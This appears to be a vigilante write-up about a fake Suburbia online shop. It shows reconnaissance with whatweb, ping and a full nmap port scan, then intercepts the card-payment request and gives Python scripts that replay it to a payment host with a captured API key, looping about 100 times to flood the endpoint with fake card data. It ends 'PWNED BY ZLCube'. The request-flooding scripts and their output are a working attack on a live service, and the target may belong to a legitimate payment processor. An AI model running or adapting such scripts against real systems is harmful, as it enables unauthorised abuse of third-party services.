
The real page looks different to the fake one, on one hand the head of the page you can see options like services, credits and account: 

![](https://github.com/ZLCube/ScamScammers/blob/main/Suburbia/ss/2.png)

On the other hand the fake page has no account section and also its showing suspicious tags, for example "Trusted Store", purchase history from other users and last but not least really cheap price tags. 

![](https://github.com/ZLCube/ScamScammers/blob/main/Suburbia/ss/3.png)

There are also some interesting things like incusted data from other sites such as "facebook, yahoo and analytics.yahoo"; And the most important warning, the fake URL:
Starting point: https://suburbiashop.shop

![](https://github.com/ZLCube/ScamScammers/blob/main/Suburbia/ss/4.png)

First we need to obtain the ip address, I got it by ussing whatweb:

```c
❯ whatweb https://suburbiashop.shop/
https://suburbiashop.shop/ [200 OK] Cookies[PHPSESSID,_fbs_fbp,axwrt,first_http_referer,first_visit_time,landing_page,order_utm_history,shop_checkout_visit_id,shop_global_visit_id,shop_global_visit_session,shop_keep_alive,utm_campaign,utm_content,utm_medium,utm_source,utm_term], Country[UNITED STATES][US], Email[services@jerrewe.shop], HTML5, HTTPServer[cloudflare], IP[104.18.4.221], Open-Graph-Protocol[website], Script[application/javascript,application/ld+json,text/javascript,text/x-template], Title[suburbia.com.mx], UncommonHeaders[x-trace-id,execution-time,trace_id,cf-cache-status,cf-ray]
```

Now we can send an ICMP trace to validate if we are against a linux or windows server:

```bash
❯ ping -c 1 104.18.4.221
PING 104.18.4.221 (104.18.4.221) 56(84) bytes of data.
64 bytes from 104.18.4.221: icmp_seq=1 ttl=59 time=36.4 ms
```

Let's also find what services are running in the server

```bash
❯ sudo nmap -p- --open -n -Pn --min-rate 5000 104.18.4.221
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-04 20:49 EDT
Nmap scan report for 104.18.4.221
Host is up (0.63s latency).
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
2052/tcp open  clearvisn
2082/tcp open  infowave
2087/tcp open  eli
2095/tcp open  nbx-ser
8080/tcp open  http-proxy
8443/tcp open  https-alt
```

I'll jump right to the main functionality, as we know, the page its impersonating `suburbia` their purpose is  to steal user's data. Let's intercept the payment requests to see where the data is going:

![](https://github.com/ZLCube/ScamScammers/blob/main/Suburbia/ss/1.png)

```r
POST /cvault/credit-card/temporal HTTP/2
Host: ppmcc.dlocal.com
Content-Length: 180
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
X-Fields-Api-Key: f8e7fd3b-3450-4ca5-ac49-101712109df6
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
X-Uow: FI-jyrAs1743814948808
Origin: https://static.dlocal.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://static.dlocal.com/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{
	"expiration_month":"09",
	"expiration_year":"2029",
	"holder_name":"John Doe",
	"pan":"1233313133313111112",
	"key":"f8e7fd3b-3450-4ca5-ac49-101712109df6",
	"country_"cvv":"691"code":"MX",
}
```

Here we notice that we are sending a post request to upload the data to:

```js
POST /cvault/credit-card/temporal HTTP/2
Host: ppmcc.dlocal.com
```

The json format is getting the input data as:

```json
{
	"expiration_month":"09",
	"expiration_year":"2029",
	"holder_name":"John Doe",
	"pan":"1233313133313111112",
	"key":"f8e7fd3b-3450-4ca5-ac49-101712109df6",
	"country_"cvv":"691"code":"MX",
}
```

With this in mind we can saturate the server by sending some trash data, just to make fun of this attackers, so lets build a python script with the required headders to impersonate the POST requests: 

```python
import requests
import random
import string
import uuid

# Random data generator function
def generate_data():
    return {
        "expiration_month": f"{random.randint(1, 12):02d}",
        "expiration_year": str(random.randint(2025, 2030)),
        "holder_name": random.choice(["John Doe", "Alice Smith", "Carlos Pérez", "Maria Garcia"]),
        "pan": "".join([str(random.randint(1, 9))] + [str(random.randint(0, 9)) for _ in range(15)]),
        "key": "f8e7fd3b-3450-4ca5-ac49-101712109df6",
        "country_code": "MX",  # corregido el error en "country_"cvv"
        "cvv": str(random.randint(100, 999))
    }

# Required headders
headers = {
    "Sec-Ch-Ua-Platform": "\"Linux\"",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "X-Fields-Api-Key": "f8e7fd3b-3450-4ca5-ac49-101712109df6",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "X-Uow": "FI-" + ''.join(random.choices(string.ascii_letters + string.digits, k=20)),
    "Origin": "https://static.dlocal.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://static.dlocal.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i"
}

# Endpoint URL
url = "https://ppmcc.dlocal.com/cvault/credit-card/temporal"

# Send POST request
def send_data():
    data = generate_data()
    response = requests.post(url, json=data, headers=headers)
    print("Status Code:", response.status_code)
    print("Response Body:", response.text)

if __name__ == "__main__":
    send_data()
```

```bash
❯ python3 poc.py
Status Code: 200
Response Body: {"token":"CV-d6646a6d-9d48-4a72-b803-301fb23e96de"}
```

Great, our request it's working so lets make a forloop to send the random generated data  in range of 1 to 100:

```python
import requests
import random
import string
import uuid

# Loop range function (For spamming requests)
def loop():
	for i in range (1,100):
		enviar_datos()
		
# Random data generator function
def generate_data():
    return {
        "expiration_month": f"{random.randint(1, 12):02d}",
        "expiration_year": str(random.randint(2025, 2030)),
        "holder_name": random.choice(["John Doe", "Alice Smith", "Carlos Pérez", "Maria Garcia"]),
        "pan": "".join([str(random.randint(1, 9))] + [str(random.randint(0, 9)) for _ in range(15)]),
        "key": "f8e7fd3b-3450-4ca5-ac49-101712109df6",
        "country_code": "MX",  # corregido el error en "country_"cvv"
        "cvv": str(random.randint(100, 999))
    }

# Required headders
headers = {
    "Sec-Ch-Ua-Platform": "\"Linux\"",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "X-Fields-Api-Key": "f8e7fd3b-3450-4ca5-ac49-101712109df6",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "X-Uow": "FI-" + ''.join(random.choices(string.ascii_letters + string.digits, k=20)),
    "Origin": "https://static.dlocal.com",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://static.dlocal.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i"
}

# Endpoint URL
url = "https://ppmcc.dlocal.com/cvault/credit-card/temporal"

# Send POST request
def send_data():
    data = generate_data()
    response = requests.post(url, json=data, headers=headers)
    print("Status Code:", response.status_code)
    print("Response Body:", response.text)

if __name__ == "__main__":
	loop()
```

```bash
❯ python3 poc.py
Status Code: 200
Response Body: {"token":"CV-e0e9537a-3610-48ec-a585-c2fd08d3196b"}
Status Code: 200
Response Body: {"token":"CV-9ad7ca06-6921-4c9e-bb51-0c5799816ede"}
Status Code: 200
Response Body: {"token":"CV-9d245d3a-8ff2-4aa4-bba9-292ce1fcde2b"}
Status Code: 200
Response Body: {"token":"CV-63156489-7d11-480b-a755-03ef3c8fb539"}
Status Code: 200
Response Body: {"token":"CV-a20f92ca-5c08-460b-9d1c-17d9ebad5535"}
Status Code: 200
Response Body: {"token":"CV-c1dae9b2-6d76-4ad1-80b2-a2345f2ee86d"}
Status Code: 200
Response Body: {"token":"CV-1a4ab6c9-2b8b-49d2-ba7c-b8ddf38f713d"}
Status Code: 200
Response Body: {"token":"CV-98729a6f-e7f6-424d-9a23-cedec3cad999"}
```

Cool, thats how you trick a scammer ;)

# PWNED BY ZLCube
